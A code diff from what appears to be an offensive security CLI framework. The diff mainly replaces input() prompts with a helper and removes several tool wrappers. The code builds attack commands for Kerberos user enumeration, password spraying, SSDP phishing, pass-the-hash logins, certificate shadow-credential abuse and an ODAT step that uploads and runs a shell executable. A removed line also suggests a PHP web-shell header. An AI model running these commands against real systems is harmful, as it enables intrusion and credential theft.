+        status_code_2 = self.ask("    [!] Enter the second expected status code (if any, otherwise leave blank): ")
 
         cmd = f"closed_source_web_server_fuzz {self.params['rhost']} {target_port} {http_method} {directory} {file_extension} {additional_extension} {status_code_1} {status_code_2}"
 
@@ -1769,7 +1329,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                     print_msg(command)
                     self.cmd(command)
         else:
-            choice_dc = input("    [!] Do you wanna use dc option ? (y/n): ") or "n"
+            choice_dc = self.ask("    [!] Do you wanna use dc option ? (y/n): ", "n")
             if choice_dc == "y":
                 dc = f" --dc {subdomain} "
             else:
@@ -1777,7 +1337,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             command = f"{kerbrute_dir}/kerbrute userenum --dc {self.params['rhost']} -d {self.params['domain']} {dc} -t 20 -v {users_txt}  | tee sessions/kerbrute_{self.params['rhost']}_userenum.txt"
             print_msg(command)
             self.cmd(command)
-            choice = input("Extend with larger dic ? (y/n)") or "y"
+            choice = self.ask("Extend with larger dic ? (y/n)", "y")
             if choice == "y":
                 users = self.params["usrwordlist"]
                 command = f"{kerbrute_dir}/kerbrute userenum --dc {self.params['rhost']} -d {self.params['domain']} -t 20 -v {users}  | tee sessions/kerbrute_{self.params['rhost']}_userenum_rockyou.txt"
@@ -1785,46 +1345,6 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                 self.cmd(command)
         return
 
-    @cmd2.with_category("02. Scanning & Enumeration")
-    def do_davtest(self, line):
-        """
-        Tests WebDAV server configurations using `davtest`.
-
-        This function checks if `davtest` is installed and installs it if necessary. It then runs `davtest`
-        to perform a WebDAV server test against a specified URL or the default URL configured in `self.params`.
-
-        :param line: The URL of the WebDAV server to test. If provided, it overrides the default URL.
-                    If not provided, the function uses the URL specified in `self.params['rhost']`.
-
-        :returns: None
-
-        Manual execution:
-        To manually test a WebDAV server, use the following command:
-            davtest --url <url>
-
-        Replace `<url>` with the URL of the WebDAV server you want to test.
-
-        For example:
-            davtest --url http://example.com/webdav
-        """
-
-        if not is_binary_present("davtest"):
-            print_warn("Installing davtest...")
-            self.cmd("sudo apt install davtest -y")
-
-        url = self.params["url"]
-        if line:
-            rhost = line
-        else:
-            rhost = "http://" + self.params["rhost"]
-            if not check_rhost(self.params["rhost"]):
-                return
-
-        print_msg(f"Try... davtest --url {self.params['rhost']} {RESET}")
-        self.cmd(f"davtest --url {self.params['rhost']}")
-        print_msg(f"Try... davtest --url {url} {RESET}")
-        self.cmd(f"davtest --url {url}")
-        return
 
     @cmd2.with_category("02. Scanning & Enumeration")
     def do_evil_ssdp(self, line):
@@ -1845,17 +1365,17 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             print_msg(f"{i}. {template}")
 
         try:
-            template_choice = int(input("Enter the number corresponding to the template: ")) - 1
+            template_choice = int(self.ask("Enter the number corresponding to the template: ")) - 1
             if template_choice < 0 or template_choice >= len(templates):
                 print_error("Invalid choice. Please select a valid number.")
                 return
             lport = self.params["lport"]
             selected_template = templates[template_choice]
-            interface = input("Enter the network interface to listen on (e.g., wlp2s0): ").strip()
-            port = input("Enter the port for the HTTP server (default seted in lport): ").strip() or lport
-            smb_server = input("Enter the IP address of your SMB server (optional, press Enter to skip): ").strip()
-            realm = input("Enter the realm for Basic Auth (optional, press Enter to skip): ").strip()
-            redirect_url = input("Enter the URL to redirect after phishing (optional, press Enter to skip): ").strip()
+            interface = self.ask("Enter the network interface to listen on (e.g., wlp2s0): ")
+            port = self.ask("Enter the port for the HTTP server (default seted in lport): ", lport)
+            smb_server = self.ask("Enter the IP address of your SMB server (optional, press Enter to skip): ")
+            realm = self.ask("Enter the realm for Basic Auth (optional, press Enter to skip): ")
+            redirect_url = self.ask("Enter the URL to redirect after phishing (optional, press Enter to skip): ")
             evil_ssdp_command = f"sudo evil-ssdp -t {selected_template} -p {port} {interface}"
 
             if smb_server:
@@ -1918,7 +1438,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             print_msg("2. Install using pipx")
 
             try:
-                install_choice = int(input("    [!] Enter the number corresponding to the installation method: "))
+                install_choice = int(self.ask("    [!] Enter the number corresponding to the installation method: "))
                 if install_choice == 1:
                     install_netexec()
                 elif install_choice == 2:
@@ -1961,7 +1481,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             print_msg(f"{i}. {protocol}")
 
         try:
-            protocol_choice = int(input("    [!] Enter the number corresponding to the protocol: ")) - 1
+            protocol_choice = int(self.ask("    [!] Enter the number corresponding to the protocol: ")) - 1
             if protocol_choice < 0 or protocol_choice >= len(protocols):
                 print_error("Invalid choice. Please select a valid number.")
                 return
@@ -2011,7 +1531,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                 for j, action in enumerate(actions[protocol], start=1):
                     print_msg(f"{j}. {action}")
 
-                action_choice = int(input("    [!] Enter the number corresponding to the action: ")) - 1
+                action_choice = int(self.ask("    [!] Enter the number corresponding to the action: ")) - 1
                 if action_choice < 0 or action_choice >= len(actions[protocol]):
                     print_error("Invalid choice. Please select a valid number.")
                     return
@@ -2070,16 +1590,16 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                 while True:
                     try:
                         option_choice = (
-                            int(input("    [!] Enter the number corresponding to the option (or 0 to finish): ")) - 1
+                            int(self.ask("    [!] Enter the number corresponding to the option (or 0 to finish): ")) - 1
                         )
                         if option_choice == -1:
                             break
                         if option_choice < 0 or option_choice >= len(options_dict[protocol][action]):
                             print_error("Invalid choice. Please select a valid number.")
                             continue
-                        option_value = input(
+                        option_value = self.ask(
                             f"    [!] Enter the value for {options_dict[protocol][action][option_choice]}: "
-                        ).strip()
+                        )
                         options.append(f"{options_dict[protocol][action][option_choice]} {option_value}")
                     except ValueError:
                         print_error("Invalid input. Please enter a valid number.")
@@ -2105,10 +1625,9 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             if options:
                 netexec_command += " " + " ".join(options)
             choice = (
-                input(
+                self.ask(
                     f"   [!] Enter 1 to use ip enter 2 to use self.params['domain'] 3 use subdomain (default 1 {self.params['rhost']}): "
-                )
-                or "1"
+                , "1")
             )
             if choice == "1":
                 netexec_command += f" {self.params['rhost']}"
@@ -2160,26 +1679,25 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
         for key, value in scan_options.items():
             print_msg(f"{key}. {value}")
 
-        choice = input("    [!] Enter your choice (1-6): ").strip()
+        choice = self.ask("    [!] Enter your choice (1-6): ")
         if choice not in scan_options:
             print_error("Invalid choice. Please enter a number between 1 and 6.")
             return
         rhost = self.params["rhost"]
         host = (
-            input(
+            self.ask(
                 f"    [!] Enter the host (e.g., 192.168.1.1/24 or self.params['domain'].com Default: {self.params['rhost']}): "
-            ).strip()
-            or self.params["rhost"]
+            , self.params["rhost"])
         )
         if not host:
             print_error("Host is required.")
             return
 
-        project = input("    [!] Enter the project name (default: scan_project): ").strip() or f"scan_project_{host}"
-        timeout = input("    [!] Enter timeout in seconds (default: 3): ").strip() or "3"
-        threads = input("    [!] Enter number of threads (default: 200): ").strip() or "200"
-        ports = input("    [!] Enter ports (optional, e.g., 80,443 or leave empty): ").strip() or "80,443"
-        proxy = input("    [!] Enter proxy (optional, e.g., socks5://127.0.0.1:1080 or leave empty): ").strip()
+        project = self.ask("    [!] Enter the project name (default: scan_project): ", f"scan_project_{host}")
+        timeout = self.ask("    [!] Enter timeout in seconds (default: 3): ", "3")
+        threads = self.ask("    [!] Enter number of threads (default: 200): ", "200")
+        ports = self.ask("    [!] Enter ports (optional, e.g., 80,443 or leave empty): ", "80,443")
+        proxy = self.ask("    [!] Enter proxy (optional, e.g., socks5://127.0.0.1:1080 or leave empty): ")
         path = os.getcwd()
         sessions = f"{path}/sessions/"
         if choice == "5":
@@ -2214,7 +1732,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             print_msg("1. Download pre-compiled binaries (Linux amd64)")
             print_msg("2. Compile from source")
             username = os.getlogin()
-            choice = input("Enter choice (1 or 2): ").strip()
+            choice = self.ask("Enter choice (1 or 2): ")
 
             if choice == "1":
                 binary_url = (
@@ -2250,21 +1768,21 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
 
         domain = (
             get_domain(self.params["url"])
-            or input("    [!] Enter the FQDN of the self.params['domain'] (e.g., 'lab.example.com'): ").strip()
+            or self.ask("    [!] Enter the FQDN of the self.params['domain'] (e.g., 'lab.example.com'): ")
         )
         rhost = self.params["rhost"]
         if not self.params["domain"]:
             print_error("Domain is required.")
             return
-        choice = input("    [!] Use file credentials.txt? (y/n, default: n): ")
+        choice = self.ask("    [!] Use file credentials.txt? (y/n, default: n): ")
         if choice == "y":
             path_cred = "sessions/credentials.txt"
 
             if not os.path.exists(path_cred):
-                username = input(
+                username = self.ask(
                     "    [!] Enter the username with self.params['domain'] (e.g., 'user@self.params['domain'].com'): "
-                ).strip()
-                password = input("    [!] Enter the password: ").strip()
+                )
+                password = self.ask("    [!] Enter the password: ")
             else:
                 with open(path_cred) as file:
                     for file_line in file:
@@ -2282,35 +1800,33 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             self.do_windapsearchscrapeusers(f"sessions/{self.params['rhost']}_windap.json")
             return
 
-        use_ntlm = input("    [!] Use NTLM auth? (y/n, default: n): ").strip().lower() or "n"
+        use_ntlm = self.ask("    [!] Use NTLM auth? (y/n, default: n): ").lower() or "n"
         ntlm_command = "--ntlm" if use_ntlm == "y" else ""
 
-        use_ldaps = input("    [!] Use LDAPS? (y/n, default: n): ").strip().lower() or "n"
+        use_ldaps = self.ask("    [!] Use LDAPS? (y/n, default: n): ").lower() or "n"
         ldaps_command = "--secure" if use_ldaps == "y" else ""
 
         output_file = (
-            input("    [!] Enter the output file (optional): ").strip()
-            or f"sessions/{self.params['domain']}_windap.json"
+            self.ask("    [!] Enter the output file (optional): ", f"sessions/{self.params['domain']}_windap.json")
         )
         output_command = f"-o {output_file}" if output_file else ""
 
-        json_output = input("    [!] Output in JSON format? (y/n, default: n): ").strip().lower() or "n"
+        json_output = self.ask("    [!] Output in JSON format? (y/n, default: n): ").lower() or "n"
         json_command = "-j" if json_output == "y" else ""
 
-        verbose = input("    [!] Enable verbose logging? (y/n, default: n): ").strip().lower() or "n"
+        verbose = self.ask("    [!] Enable verbose logging? (y/n, default: n): ").lower() or "n"
         verbose_command = "-v" if verbose == "y" else ""
 
         module = (
-            input(
+            self.ask(
                 "    [!] Enter the module to use (e.g., 'admin-objects' , 'computers', 'custom'   , 'dns-names', 'dns-zones', 'self.params['domain']-admins', 'gpos'' , 'groups'   , 'members'  , 'metadata' , 'privileged-users , 'search'   , 'unconstrained', 'user-spns', 'users' ): "
-            ).strip()
-            or "users"
+            , "users")
         )
         if not module:
             print_error("Module is required.")
             return
 
-        module_options = input("    [!] Enter any additional options for the module (optional): ").strip()
+        module_options = self.ask("    [!] Enter any additional options for the module (optional): ")
 
         command = (
             f"windapsearch -d {self.params['domain']} -u {username} -p {password} {ntlm_command} {ldaps_command} "
@@ -2385,73 +1901,6 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
         self.cmd("tac sessions/users.txt | grep -v '^$' | sponge sessions/users.txt")
         return
 
-    @cmd2.with_category("02. Scanning & Enumeration")
-    def do_arjun(self, line):
-        """
-        Executes an Arjun scan on the specified URL for parameter discovery.
-
-        This function checks if Arjun is installed on the system, installs it if necessary, and then constructs
-        a command to run Arjun against the provided URL with user-defined options.
-
-        Parameters:
-            line (str): Input line, not currently used.
-        """
-
-        if not is_binary_present("arjun"):
-            print_warn("Arjun is not present in the system, installing...")
-            self.cmd("pip3 install arjun")
-
-        rhost = self.params["rhost"]
-        url = self.params["url"]
-        domain = get_domain(url)
-        path = os.getcwd()
-        file = f"{path}/sessions/{self.params['rhost']}_arjun_{self.params['domain']}.txt"
-
-        command = f"arjun -u {url} -oT {file} -t 20"
-        if line and line.startswith("fast"):
-            print_msg("Fast Arjun")
-        else:
-            method = prompt("[?] Specify HTTP method (GET/POST/JSON/XML, default: GET): ", "GET")
-            command += f" -m {method}"
-
-            input_file = prompt("[?] Import targets from a file (leave empty to skip): ", "")
-            if input_file:
-                command += f" -i {input_file}"
-
-            wordlist = prompt("[?] Use custom wordlist (leave empty to skip): ", "")
-            if wordlist:
-                command += f" -w {wordlist}"
-
-            chunk_size = prompt("[?] Control query size (default: 500, leave empty to skip): ", "500")
-            if chunk_size:
-                command += f" -c {chunk_size}"
-
-            delay = prompt("[?] Delay between requests in seconds (leave empty to skip): ", "")
-            if delay:
-                command += f" -d {delay}"
-
-            include_data = prompt("[?] Include persistent data (e.g., 'api_key=xxxxx', leave empty to skip): ", "")
-            if include_data:
-                command += f" --include='{include_data}'"
-
-            headers = prompt(
-                "[?] Use custom HTTP headers (e.g., \"User-Agent: <?php system($_GET['c']); ?>\", leave empty to skip): ",
-                "",
-            )
-            if headers:
-                command += f" --headers '{headers}'"
-
-            timeout = prompt("[?] Set request timeout in seconds (default: 15, leave empty to skip): ", "15")
-            if timeout:
-                command += f" -T {timeout}"
-
-            stable_mode = prompt("[?] Enable stable mode (y/n, default: n): ", "n")
-            if stable_mode.lower() == "y":
-                command += " --stable"
-
-        print_msg(f"Executing command: {command}")
-        self.cmd(command)
-        return
 
     @cmd2.with_category("02. Scanning & Enumeration")
     def do_finger_user_enum(self, line):
@@ -2478,7 +1927,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             print_msg(github)
             self.cmd(github)
 
-        use_small_dict = input("    [?] Do you want to use the small dictionary? (yes/no): ").strip().lower()
+        use_small_dict = self.ask("    [?] Do you want to use the small dictionary? (yes/no): ").lower()
 
         if use_small_dict == "yes":
             path = os.getcwd()
@@ -2529,7 +1978,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             print_msg("WPScan is already installed.")
 
         if not line:
-            url = input(f"    [!] Enter the WordPress site URL to scan (default {url_target}): ").strip() or url_target
+            url = self.ask(f"    [!] Enter the WordPress site URL to scan (default {url_target}): ", url_target)
         else:
             url = line.strip()
 
@@ -2537,14 +1986,13 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             print_warn("No URL provided, aborting scan.")
             return
 
-        stealthy = input("    [?] Do you want to enable stealthy mode? (y/n): ").strip().lower() or "n"
+        stealthy = self.ask("    [?] Do you want to enable stealthy mode? (y/n): ").lower() or "n"
         stealthy_flag = "--stealthy" if stealthy == "y" else ""
 
         enumerate_option = (
-            input(
+            self.ask(
                 "    [?] Do you want to enumerate usernames or plugins? (e.g., u, u1-100, p,  default is none): "
-            ).strip()
-            or ""
+            , "")
         )
         enumerate_flag = f"--enumerate {enumerate_option}" if enumerate_option else ""
 
@@ -2562,98 +2010,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
         self.cmd(command)
         return
 
-    @cmd2.with_category("02. Scanning & Enumeration")
-    def do_loxs(self, line):
-        """
-        Command loxs: Installs and runs Loxs for multi-vulnerability web application scanning.
 
-        This function performs the following tasks:
-        1. Checks if Loxs is already cloned in the external/.exploit directory.
-        2. Clones the Loxs repository if not present.
-        3. Installs required dependencies.
-        4. Prompts the user for a URL or file input, custom payload file, success criteria, and thread count.
-        5. Executes Loxs for scanning vulnerabilities like LFI, OR, XSS, and SQLi.
-        6. Displays real-time results and optionally saves vulnerable URLs.
-
-        Args:
-            line (str): Optional argument for specifying the input URL or file, custom payload, and additional options.
-
-        Returns:
-            None
-
-        Example:
-            loxs --url target.com
-        """
-        path = os.getcwd()
-        exploit_dir = os.path.join(path, "external/.exploit")
-        loxs_url = "https://github.com/coffinxp/loxs.git"
-        loxs_dir = os.path.join(exploit_dir, "loxs")
-        self.params["url"]
-        os.makedirs(exploit_dir, exist_ok=True)
-
-        if not os.path.exists(loxs_dir):
-            print_msg("Cloning Loxs repository...")
-            self.cmd(f"git clone {loxs_url} {loxs_dir}")
-            print_msg("Installing requirements...")
-            self.cmd(f"cd {loxs_dir} && pip3 install -r requirements.txt")
-
-        else:
-            print_msg("Loxs already cloned, skipping cloning.")
-
-        command = f"cd {loxs_dir} && python3 loxs.py"
-
-        print_msg(f"Running Loxs scan: {command}")
-        self.cmd(command)
-        return
-
-    @cmd2.with_category("02. Scanning & Enumeration")
-    def do_blazy(self, line):
-        """
-        Command blazy: Installs and runs blazy for multi-vulnerability web application scanning.
-
-        This function performs the following tasks:
-        1. Checks if blazy is already cloned in the external/.exploit directory.
-        2. Clones the blazy repository if not present.
-        3. Installs required dependencies.
-        4. Prompts the user for a URL or file input, custom payload file, success criteria, and thread count.
-        5. Executes blazy for Bruteforce Login.
-        6. Displays real-time results and optionally saves vulnerable URLs.
-
-        Args:
-            line (str): Optional argument for specifying the input URL.
-
-        Returns:
-            None
-
-        Example:
-            python3 main.py -i target.com
-        """
-        path = os.getcwd()
-        exploit_dir = os.path.join(path, "external/.exploit")
-        blazy_url = "https://github.com/s0md3v/Blazy.git"
-        blazy_dir = os.path.join(exploit_dir, "blazy")
-        url = self.params["url"]
-        os.makedirs(exploit_dir, exist_ok=True)
-
-        if not os.path.exists(blazy_dir):
-            print_msg("Cloning blazy repository...")
-            self.cmd(f"git clone {blazy_url} {blazy_dir}")
-            print_msg("Installing requirements...")
-            self.cmd(f"cd {blazy_dir}")
-
-        else:
-            print_msg("blazy already cloned, skipping cloning.")
-
-        if not line:
-            target = input(f"    {GREEN}[!] Enter the target url (Default: {url}): ") or url
-        else:
-            target = line.strip()
-
-        command = f"cd {blazy_dir} && python3 main.py -i {target}"
-
-        print_msg(f"Running blazy scan: {command}")
-        self.cmd(command)
-        return
 
     @cmd2.with_category("02. Scanning & Enumeration")
     def do_parth(self, line):
@@ -2695,24 +2052,21 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
 
         if not line:
             target = (
-                input(
+                self.ask(
                     f"    {GREEN}[!] Enter the target self.params['domain'] or file: (default: {self.params['domain']}) "
-                ).strip()
-                or self.params["domain"]
+                , self.params["domain"])
             )
-            output = input("    [?] Do you want to save output as JSON (y/n)? ").strip().lower() or "n"
+            output = self.ask("    [?] Do you want to save output as JSON (y/n)? ").lower() or "n"
             json_output = f"-o {target}.json" if output == "y" else ""
             import_option = (
-                input("    [?] Specify an import option (e.g., -i file.history, --pipe xss, or leave blank): ").strip()
-                or ""
+                self.ask("    [?] Specify an import option (e.g., -i file.history, --pipe xss, or leave blank): ", "")
             )
         else:
             target = line.strip()
-            output = input("    [?] Do you want to save output as JSON (y/n)? ").strip().lower() or "n"
+            output = self.ask("    [?] Do you want to save output as JSON (y/n)? ").lower() or "n"
             json_output = f"-o {target}.json" if output == "y" else ""
             import_option = (
-                input("    [?] Specify an import option (e.g., -i file.history, --pipe xss, or leave blank): ").strip()
-                or ""
+                self.ask("    [?] Specify an import option (e.g., -i file.history, --pipe xss, or leave blank): ", "")
             )
 
         if not target:
@@ -2763,10 +2117,10 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             print_msg("Breacher already cloned, skipping cloning.")
 
         if not line:
-            url = input(f"    [!] Enter the target URL (default: {url}): ").strip() or url
-            file_type = input("    [?] Enter the file type (php, asp, html): ").strip() or "php"
-            custom_path = input("    [?] Specify a custom path of url (optional): ").strip() or ""
-            threads = input("    [?] Enable multi-threading? (y/n): ").strip().lower() or "n"
+            url = self.ask(f"    [!] Enter the target URL (default: {url}): ", url)
+            file_type = self.ask("    [?] Enter the file type (php, asp, html): ", "php")
+            custom_path = self.ask("    [?] Specify a custom path of url (optional): ", "")
+            threads = self.ask("    [?] Enable multi-threading? (y/n): ").lower() or "n"
             fast_flag = "--fast" if threads == "y" else ""
         else:
             args = line.split()
@@ -2827,14 +2181,13 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
 
         if not line:
             urls_file = (
-                input(f"    {GREEN}[!] Enter the path to the list of URLs (default: {file_url}): ").strip() or file_url
+                self.ask(f"    {GREEN}[!] Enter the path to the list of URLs (default: {file_url}): ", file_url)
             )
             payloads_file = (
-                input(f"    [?] Enter the path to the payloads file (default: {file_payloads}): ").strip()
-                or file_payloads
+                self.ask(f"    [?] Enter the path to the payloads file (default: {file_payloads}): ", file_payloads)
             )
-            keyword = input("    [?] Enter the keyword to replace in URLs (default 'FUZZ'): ").strip() or "FUZZ"
-            concurrency = input("    [?] Enter the concurrency level (default 100): ").strip() or "100"
+            keyword = self.ask("    [?] Enter the keyword to replace in URLs (default 'FUZZ'): ", "FUZZ")
+            concurrency = self.ask("    [?] Enter the concurrency level (default 100): ", "100")
 
         else:
             args = line.split()
@@ -2892,10 +2245,9 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             print_msg("ODAT already downloaded, skipping download.")
 
         rhost = (
-            input(f"    {GREEN}[!] Enter the target RHOST (default {self.params['rhost']}): ").strip()
-            or self.params["rhost"]
+            self.ask(f"    {GREEN}[!] Enter the target RHOST (default {self.params['rhost']}): ", self.params["rhost"])
         )
-        port = input("    [?] Enter the target port (default 1521): ").strip() or "1521"
+        port = self.ask("    [?] Enter the target port (default 1521): ", "1521")
 
         if not line:
             list_attacks = ["sidguesser", "passwordguesser", "utlfile", "externaltable"]
@@ -2903,7 +2255,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             for i, attack in enumerate(list_attacks, 1):
                 print_warn(f"{i}. {attack}")
         try:
-            selected_attack = int(input(f"{GREEN}    [!] Enter yout choice (1-{len(list_attacks)}): "))
+            selected_attack = int(self.ask(f"{GREEN}    [!] Enter yout choice (1-{len(list_attacks)}): "))
             if 1 <= selected_attack <= len(list_attacks):
                 print_msg(f"Attack selected: {list_attacks[selected_attack - 1]}")
                 line = list_attacks[selected_attack - 1]
@@ -2923,7 +2275,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             self.cmd(odat_command)
 
         elif line.startswith("passwordguesser"):
-            SID = input("    [!] Enter valid SID: ")
+            SID = self.ask("    [!] Enter valid SID: ")
             odat_command = f"cd {odat_dir}/odat-libc2.17-x86_64 && {odat_path} passwordguesser -s {self.params['rhost']} -p {port} -d {SID} --accounts-file accounts/accounts.txt"
             print_msg(f"Running ODAT SID guessing on {self.params['rhost']}:{port}... {odat_command}")
 
@@ -2939,7 +2291,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                     for user, passwd in credentials:
                         password = passwd
                         username = user
-                    SID = input("    [!] Enter valid SID: ")
+                    SID = self.ask("    [!] Enter valid SID: ")
                     odat_command = f"cd {sessions_dir} && {odat_path} utlfile -s {self.params['rhost']} -p {port} -U {username} -P {password} -d {SID} --sysdba --putFile /temp shell64.exe shell64.exe"
                     print_msg(f"Running ODAT SID guessing on {self.params['rhost']}:{port}... {odat_command}")
 
@@ -2958,10 +2310,10 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                 for user, passwd in credentials:
                     password = passwd
                     username = user
-                SID = input("    [!] Enter valid SID: ")
+                SID = self.ask("    [!] Enter valid SID: ")
                 odat_command = f"{odat_path} externaltable -s {self.params['rhost']} -p {port} -U {username} -P {password} -d {SID} --sysdba --exec /temp shell64.exe"
                 print_msg(f"Running ODAT SID guessing on {self.params['rhost']}:{port}... {odat_command}")
-                input(
+                self.ask(
                     f"Press enter to execute, rember metasploit handdler must be listening, use in another terminal:{GREEN} msf rev win64 {RESET}"
                 )
                 self.cmd(odat_command)
@@ -2972,48 +2324,6 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
         print_msg("Odat command executed: odat_command")
         return
 
-    @cmd2.with_category("02. Scanning & Enumeration")
-    def do_rpcmap_py(self, line):
-        """
-        Command rpcmap_py: Executes rpcmap.py commands to enumerate MSRPC interfaces.
-
-        This function allows the user to:
-        1. Run rpcmap.py with a specified string binding to discover MSRPC interfaces.
-        2. Filter the output using grep for specific DCOM-related interfaces.
-        3. Optionally run rpcmap.py with additional flags for brute-forcing opnums and adjusting the authentication level.
-
-        Args:
-            line (str): Optional argument specifying the string binding or additional flags for rpcmap.py.
-
-        Returns:
-            None
-
-        Example:
-            rpcmap_py 'ncacn_ip_tcp:10.10.10.213'
-            rpcmap_py 'ncacn_ip_tcp:10.10.10.213' -brute-opnums -auth-level 1 -opnum-max 5
-        """
-        os.getcwd()
-        rhost = self.params["rhost"]
-
-        if not is_binary_present("rpcmap.py"):
-            print_warn("rpcmap.py not found installing...")
-            self.cmd("sudo apt install impacket -y")
-
-        if not line:
-            command = f"rpcmap.py 'ncacn_ip_tcp:{self.params['rhost']}'"
-            print_msg(f"Try... {command}")
-            self.cmd(command)
-            command = f"rpcmap.py 'ncacn_ip_tcp:{self.params['rhost']}' | grep -A2 'DCOM'"
-            print_msg(f"Try... {command}")
-            self.cmd(command)
-        else:
-            if line.startswith("brute"):
-                command = f"rpcmap.py 'ncacn_ip_tcp:{self.params['rhost']}' -brute-opnums -auth-level 1 -opnum-max 5"
-                print_msg(f"Try... {command}")
-                self.cmd(command)
-
-        print_msg(f"Running RPCMap command: {command}")
-        return
 
     @cmd2.with_category("02. Scanning & Enumeration")
     def do_pykerbrute(self, line):
@@ -3048,7 +2358,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
         print_warn("1. Enumerate valid Active Directory accounts (EnumADUser.py)")
         print_warn("2. Password spray (ADPwdSpray.py)")
 
-        attack_choice = input("Enter the number of the attack mode you want to use: ").strip()
+        attack_choice = self.ask("Enter the number of the attack mode you want to use: ")
 
         if attack_choice == "1":
             script = "EnumADUser.py"
@@ -3062,13 +2372,12 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
         subdomain = self.params["subdomain"]
         users_file = "henry.vinson"
         domain_controller = (
-            input(f"    [?] Enter the Domain Controller address (default '{subdomain}'): ").strip() or subdomain
+            self.ask(f"    [?] Enter the Domain Controller address (default '{subdomain}'): ", subdomain)
         )
         domain = (
-            input(f"    [?] Enter the self.params['domain'] name (default '{self.params['domain']}'): ").strip()
-            or self.params["domain"]
+            self.ask(f"    [?] Enter the self.params['domain'] name (default '{self.params['domain']}'): ", self.params["domain"])
         )
-        user_file = input(f"    [?] Enter the username (default '{users_file}'): ").strip() or users_file
+        user_file = self.ask(f"    [?] Enter the username (default '{users_file}'): ", users_file)
 
         if script == "ADPwdSpray.py":
             password_data = get_hash(True)
@@ -3078,7 +2387,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             command = f"cd sessions && {export} python2 {pykerbrute_dir}/{script} {domain_controller} {self.params['domain']} {user_file} {password_data} "
         else:
             user_file = get_users_dic()
-            mode_choice = input("    [!] Enter mode: (tcp/udp): ") or "tcp"
+            mode_choice = self.ask("    [!] Enter mode: (tcp/udp): ", "tcp")
             command = f"cd sessions && {export} python2 {pykerbrute_dir}/{script} {domain_controller} {self.params['domain']} {user_file} {mode_choice}"
 
         print_msg(f"Executing: {command}")
@@ -3139,7 +2448,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                 hashis = f"-hashes {hash_value}"
             else:
                 hashis = f"-hashes :{hash_value}"
-            user = input("    [!] Enter Username (default: Administrator): ") or "Administrator"
+            user = self.ask("    [!] Enter Username (default: Administrator): ", "Administrator")
             command = f"impacket-netview -user {user} -target {self.params['domain']} -dc-ip {self.params['rhost']} {hashis} {self.params['domain']}/{user}"
             print_msg(command)
             self.cmd(command)
@@ -3204,7 +2513,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             else:
                 hashis = f"-hashes :{hash_value}"
 
-            user = input("    [!] Enter Username (default: Administrator): ") or "Administrator"
+            user = self.ask("    [!] Enter Username (default: Administrator): ", "Administrator")
             command = f"env/bin/rdp_check.py {self.params['domain']}/{user}@{self.params['rhost']} {hashis}"
             print_msg(command)
             self.cmd(command)
@@ -3318,9 +2627,9 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                 print_error("Need credentials to use this options. use: createcredentials admin:admin")
                 return
             dc_ip = (
-                input(f"    [!] Enter Domain Controller IP (default: {self.params['rhost']}): ") or self.params["rhost"]
+                self.ask(f"    [!] Enter Domain Controller IP (default: {self.params['rhost']}): ", self.params["rhost"])
             )
-            target_ip = input(f"    [!] Enter Target IP (default: {self.params['rhost']}): ") or self.params["rhost"]
+            target_ip = self.ask(f"    [!] Enter Target IP (default: {self.params['rhost']}): ", self.params["rhost"])
             if not dc_ip or not target_ip:
                 print_error("Domain Controller and Target IPs are required for 'dc-target' mode.")
                 return
@@ -3333,7 +2642,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                 self.cmd(command)
             return
         elif line == "nopass":
-            increase = input("    [!] We increase this limit to (default 10000) ") or "10000"
+            increase = self.ask("    [!] We increase this limit to (default 10000) ", "10000")
             command = f"lookupsid.py nan@{self.params['rhost']} {increase} -no-pass | grep 'SidTypeUser' | sed 's/.*\\(.*\\) \\(SidTypeUser\\)/\\1/' > sessions/{self.params['rhost']}_lookupsid_usernames.txt"
             print_msg(command)
             self.cmd(command)
@@ -3394,7 +2703,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             else:
                 hashis = f"-hashes :{hash_value}"
 
-            user = input("    [!] Enter Username (default: Administrator): ") or "Administrator"
+            user = self.ask("    [!] Enter Username (default: Administrator): ", "Administrator")
             command = f"impacket-lookupsid {self.params['domain']}/{user}@{self.params['rhost']} {hashis}"
             print_msg(command)
             self.cmd(command)
@@ -3429,7 +2738,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
         if line.startswith("shadow"):
             username = user
             password = passwd
-            account = input("    [!] Enter Account for shadow abuse (default WINRM_SVC): ") or "WINRM_SVC"
+            account = self.ask("    [!] Enter Account for shadow abuse (default WINRM_SVC): ", "WINRM_SVC")
             command = f"certipy-ad shadow auto -u '{username}@{self.params['domain']}' -p '{password}' -account '{account}' -dc-ip {target}"
             self.cmd(command)
 
@@ -3437,26 +2746,26 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
